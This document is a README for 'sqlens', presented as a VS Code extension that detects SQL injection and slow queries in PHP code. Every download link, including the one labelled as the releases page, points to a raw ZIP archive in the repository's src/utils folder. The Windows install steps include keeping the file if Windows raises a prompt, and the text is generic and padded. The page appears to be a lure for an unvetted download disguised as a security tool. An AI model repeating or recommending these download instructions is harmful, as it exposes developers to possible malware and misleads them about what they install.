# 🔍 sqlens - Find SQL Issues in PHP Code

[![Download sqlens](https://img.shields.io/badge/Download%20sqlens-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip)

## 🧩 What sqlens does

sqlens is a VS Code extension that checks SQL queries in PHP code for common problems. It helps you spot security risks, slow queries, and coding patterns that need work.

Use it if you want a simple way to review SQL inside PHP files while you work in Visual Studio Code. It fits well with Laravel, WordPress, PDO code, and other PHP projects that build SQL queries in code.

## 📥 Download and install

1. Open the [sqlens releases page](https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip).
2. Download the Windows file from the latest release.
3. If the file is a ZIP, extract it to a folder on your PC.
4. Open Visual Studio Code.
5. Install the extension from the file you downloaded, or use the extension install flow in VS Code if the release includes a VSIX file.
6. Restart VS Code after the install finishes.

If you use the Microsoft Store version of VS Code, use the same release file and follow the same install steps inside VS Code.

## 🪟 Windows setup

After you download the release, keep the file in a folder you can find again, such as Downloads or Desktop.

For most Windows users, the process is:

1. Go to the release page.
2. Get the latest build for Windows.
3. Save the file.
4. Open VS Code.
5. Add the extension.
6. Reload VS Code when it asks.

If Windows shows a file prompt, choose the option that keeps the file on your device. Then install it from VS Code.

## ⚙️ How to use sqlens

Once sqlens is installed, open a PHP file that contains SQL.

The extension scans common query patterns and looks for:

- SQL injection risks
- Unsafe string building
- Missing parameter use
- Slow query patterns
- Query structure issues
- Code that can be cleaner or safer

You do not need to start a scan by hand in most cases. Open your PHP file and work as usual. sqlens checks the code as you edit it.

## 🧪 What it checks

sqlens is built for code that mixes PHP and SQL. It can help with:

- `PDO` queries
- Laravel database calls
- WordPress database code
- Plain PHP SQL strings
- Dynamic query building
- Raw SQL inside app code

It looks for patterns that often lead to trouble, such as:

- Putting user input straight into a query
- Building long SQL strings with many parts
- Skipping placeholders
- Repeating query work that can be simplified
- Query text that may be hard to read or maintain

## 🗂️ File types and project fit

sqlens works best in projects that keep SQL inside PHP files. Common examples include:

- `*.php`
- Laravel app files
- WordPress plugins and themes
- Custom admin tools
- Internal business apps
- API back ends

If your codebase uses SQL in PHP, sqlens can help you review it while you write.

## 🛠️ Basic workflow

Use this flow for the smoothest setup on Windows:

1. Install VS Code if you do not have it.
2. Open the sqlens release page.
3. Download the latest Windows package.
4. Install the extension in VS Code.
5. Open a PHP project.
6. Open a file with SQL code.
7. Review the alerts, hints, or highlights that sqlens shows.
8. Fix unsafe or hard-to-read query code.
9. Save the file and check the result again.

## 🔒 Security checks

sqlens helps you catch patterns that can lead to SQL injection. It pays attention to places where PHP code joins user data into SQL.

Common cases it can flag:

- Raw request values in a query
- Query text built with concatenation
- Unsafe filter or search logic
- Missing parameter binding
- Manual quoting that can fail or break

Use the extension as a second set of eyes when you review PHP database code.

## ⚡ Performance checks

sqlens also looks for query patterns that can slow an app down.

It can help identify:

- Repeated query logic
- Large query strings that are hard to optimize
- Filters that may cause heavy database work
- Query shapes that are not easy to maintain
- Patterns that often hide slow behavior

This is useful when you work on pages that load data from large tables or run many queries at once.

## 📚 Best practices it supports

sqlens is useful when you want your query code to stay clean and easy to read. It encourages habits like:

- Using parameters instead of string joins
- Keeping SQL short and clear
- Reusing query parts with care
- Writing code that is easier to review
- Keeping data input separate from SQL text

These habits help teams avoid bugs and reduce time spent on fixes.

## 🧑‍💻 Example use cases

sqlens fits many common PHP workflows:

- A Laravel app that builds filters from form data
- A WordPress plugin that reads custom database records
- A PDO script that fetches user accounts
- An admin tool that searches and sorts records
- A report page that joins several tables

In each case, the extension helps you spot query problems before they spread through the codebase.

## 🧰 Troubleshooting

If sqlens does not appear to work after install, try these steps:

1. Restart VS Code.
2. Open a PHP file, not a text note or empty file.
3. Check that the code contains SQL text.
4. Make sure the extension is installed in the current VS Code profile.
5. Reopen the project folder.
6. Download the latest release again if the file looks incomplete.

If the extension still does not show results, remove it from VS Code and install it again from the release page.

## 🪄 Tips for better results

To get the most from sqlens:

- Keep SQL in one place when you can
- Use clear variable names
- Avoid long query chains in one line
- Separate user input from SQL text
- Review each flagged query instead of ignoring the list
- Check both new code and old code when you change a file

Small code changes can make a big difference in safety and speed.

## 📦 Release page

Use this link to get the latest Windows download:

[https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip](https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip)

## 🖥️ System fit

sqlens is made for use in Visual Studio Code on Windows. A typical setup includes:

- Windows 10 or Windows 11
- Visual Studio Code
- A PHP project
- A working internet connection for the initial download

It is best used on a normal desktop or laptop where you edit PHP files in VS Code.

## 🔎 Topic focus

sqlens matches these common areas of work:

- code analysis
- developer tools
- Laravel
- linter
- PDO
- PHP
- PHP security
- query optimization
- security
- SQL
- SQL injection
- static analysis
- VS Code extension
- WordPress

## 🧭 First file to open

After install, start with one PHP file that has a few SQL queries. That makes it easier to see how sqlens behaves.

Good starter files include:

- a login page
- a search page
- a report page
- a database helper file
- a WordPress plugin file
- a Laravel controller or service file

Open the file, review the query code, and fix the items that look unsafe or hard to maintain